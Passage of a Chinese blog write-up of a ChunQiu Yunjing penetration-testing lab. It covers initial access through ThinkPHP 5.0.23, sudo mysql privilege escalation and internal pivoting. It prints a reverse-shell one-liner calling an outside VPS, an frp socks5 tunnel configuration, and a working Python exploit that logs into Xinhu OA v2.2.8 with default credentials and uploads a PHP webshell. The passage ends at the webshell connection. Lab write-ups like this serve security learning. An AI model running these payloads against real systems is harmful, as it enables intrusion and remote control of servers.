@@ -1,0 +1,3468 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="春秋云镜打靶 Initial 先fscan扫描发现thinkphp5.0.23\n工具上马\n蚁剑连上shell之后发现低权限啥也干不了\nsudo -l发现mysql是root权限的，去GTFObins找提权命令，反弹shell\n">
+<title>春秋云镜打靶</title>
+
+<link rel='canonical' href='https://0d000721999.github.io/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/'>
+
+<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="春秋云镜打靶">
+<meta property='og:description' content="春秋云镜打靶 Initial 先fscan扫描发现thinkphp5.0.23\n工具上马\n蚁剑连上shell之后发现低权限啥也干不了\nsudo -l发现mysql是root权限的，去GTFObins找提权命令，反弹shell\n">
+<meta property='og:url' content='https://0d000721999.github.io/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/'>
+<meta property='og:site_name' content='美咕噜的小站'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='打靶' /><meta property='article:tag' content='渗透' /><meta property='article:published_time' content='2026-03-11T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-03-11T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/1.jpg' />
+<meta name="twitter:title" content="春秋云镜打靶">
+<meta name="twitter:description" content="春秋云镜打靶 Initial 先fscan扫描发现thinkphp5.0.23\n工具上马\n蚁剑连上shell之后发现低权限啥也干不了\nsudo -l发现mysql是root权限的，去GTFObins找提权命令，反弹shell\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://0d000721999.github.io/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/1.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "light");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu988272603220494224.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">美咕噜的小站</a></h1>
+            <h2 class="site-description">Ciallo～(∠・ω&lt; )⌒★</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://buuoj.cn/users/175721'
+                        target="_blank"
+                        title="BUUOJ"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
+  <line x1="7" y1="12" x2="13" y2="12" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/0d000721999'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#initial">Initial</a></li>
+    <li><a href="#tsclient">Tsclient</a></li>
+    <li><a href="#exchange">Exchange</a></li>
+    <li><a href="#delegation">Delegation</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/">
+                <img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/1.jpg"
+                        
+                        width="2435" 
+                        height="1843" 
+                        loading="lazy"
+                        alt="Featured image of post 春秋云镜打靶" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%88%B7%E9%A2%98%E6%89%93%E9%9D%B6/" style="background-color: #264653; color: #fff;">
+                刷题&amp;&amp;打靶
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/">春秋云镜打靶</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 11, 2026</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 17 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="春秋云镜打靶">春秋云镜打靶
+</h1><h2 id="initial">Initial
+</h2><p>先fscan扫描发现thinkphp5.0.23</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311002312637.png"
+	width="1483"
+	height="762"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311002312637_hu3747142270329660546.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311002312637_hu17427945557785148926.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311002312637"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="467px"
+	
+></p>
+<p>工具上马</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311002331568.png"
+	width="982"
+	height="739"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311002331568_hu2492729502509258282.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311002331568_hu16818207092206036070.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311002331568"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="132"
+		data-flex-basis="318px"
+	
+></p>
+<p>蚁剑连上shell之后发现低权限啥也干不了</p>
+<p><code>sudo -l</code>发现mysql是root权限的，去GTFObins找提权命令，反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo mysql -e <span class="s1">&#39;\! rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 47.122.53.248 2333 &gt;/tmp/f&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>弹shell完在root下就有flag01.txt</p>
+<p>然后进一步内网探测，上传fscan,但是我蚁剑抽风了，从vps上wget我的fscan进行扫描，这里ifconfig查看ip为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">172.22.1.15
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>fscan扫描</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./fscan -h 172.22.1.0/24
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311002810178.png"
+	width="1058"
+	height="479"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311002810178_hu4234839486495253460.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311002810178_hu18314918777582626263.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311002810178"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="220"
+		data-flex-basis="530px"
+	
+></p>
+<p>总结一下信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">172.22.1.2:DC域控
+</span></span><span class="line"><span class="cl">172.22.1.21:Windows的机器并且存在MS17-010 漏洞
+</span></span><span class="line"><span class="cl">172.22.1.18:信呼OA办公系统
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先看这个信呼，这里需要内网穿透，进行代理，这里用frp+proxifier进行代理</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003017055.png"
+	width="784"
+	height="185"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003017055_hu1972760044585615847.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003017055_hu17994889686393694018.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311003017055"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="423"
+		data-flex-basis="1017px"
+	
+></p>
+<p>新版的frp从ini改成toml了，其实用法差不多</p>
+<p>配个frpc.toml,这里用socks5代理</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-toml" data-lang="toml"><span class="line"><span class="cl"><span class="nx">serverAddr</span> <span class="p">=</span> <span class="s2">&#34;47.122.53.248&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">serverPort</span> <span class="p">=</span> <span class="mi">7000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[[</span><span class="nx">proxies</span><span class="p">]]</span>
+</span></span><span class="line"><span class="cl"><span class="nx">name</span> <span class="p">=</span> <span class="s2">&#34;socks5&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">type</span> <span class="p">=</span> <span class="s2">&#34;tcp&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">remotePort</span> <span class="p">=</span> <span class="mi">7890</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">proxies</span><span class="p">.</span><span class="nx">plugin</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nx">type</span> <span class="p">=</span> <span class="s2">&#34;socks5&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后frpc和对应的toml传靶机上，这里还是古法wget，然后我们vps放frps和对应toml</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./frps -c frps.toml
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>vps启动后，再去靶机启动</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./frpc -c frpc.toml
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>连接建立好后，我们本机的proxifier配置代理服务器</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003452398.png"
+	width="594"
+	height="338"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003452398_hu12631657109195799315.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003452398_hu14442845376822302114.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311003452398"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="175"
+		data-flex-basis="421px"
+	
+></p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003506599.png"
+	width="956"
+	height="498"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003506599_hu13120598930010456426.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003506599_hu10985181946072440404.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311003506599"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="191"
+		data-flex-basis="460px"
+	
+></p>
+<p>然后浏览器能正常访问172.22.1.18就成功了，这里版本是v2.2.8是有poc的，直接拿来打，默认密码admin/admin123改一下，注意这里脚本也要配代理</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;http&#34;</span><span class="p">:</span>  <span class="s2">&#34;socks5h://47.122.53.248:7890&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;https&#34;</span><span class="p">:</span> <span class="s2">&#34;socks5h://47.122.53.248:7890&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">url_pre</span> <span class="o">=</span> <span class="s1">&#39;http://172.22.1.18/&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url1</span> <span class="o">=</span> <span class="n">url_pre</span> <span class="o">+</span> <span class="s1">&#39;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url2</span> <span class="o">=</span> <span class="n">url_pre</span> <span class="o">+</span> <span class="s1">&#39;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url3</span> <span class="o">=</span> <span class="n">url_pre</span> <span class="o">+</span> <span class="s1">&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">data1</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;rempass&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;jmpass&#39;</span><span class="p">:</span> <span class="s1">&#39;false&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;device&#39;</span><span class="p">:</span> <span class="s1">&#39;1625884034525&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;ltype&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;adminuser&#39;</span><span class="p">:</span> <span class="s1">&#39;YWRtaW4=&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;adminpass&#39;</span><span class="p">:</span> <span class="s1">&#39;YWRtaW4xMjM=&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;yanzm&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url1</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url2</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;1.php&#39;</span><span class="p">,</span> <span class="s1">&#39;r+&#39;</span><span class="p">)})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">filepath</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;filepath&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">filepath</span> <span class="o">=</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">filepath</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.uptemp&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.php&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">id</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">url3</span> <span class="o">=</span> <span class="n">url_pre</span> <span class="o">+</span> <span class="sa">f</span><span class="s1">&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_pre</span> <span class="o">+</span> <span class="n">filepath</span> <span class="o">+</span> <span class="s2">&#34;?1=system(&#39;dir&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后1.php的内容也是一句话木马</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003845516.png"
+	width="1467"
+	height="184"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003845516_hu5146583727473817718.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003845516_hu6837724410551073411.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311003845516"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="797"
+		data-flex-basis="1913px"
+	
+></p>
+<p>蚁剑连接，这里蚁剑也要配代理</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003917099.png"
+	width="1284"
+	height="872"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003917099_hu15918590646470414005.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003917099_hu2874345714117931462.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311003917099"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="147"
+		data-flex-basis="353px"
+	
+></p>
+<p>连接上</p>
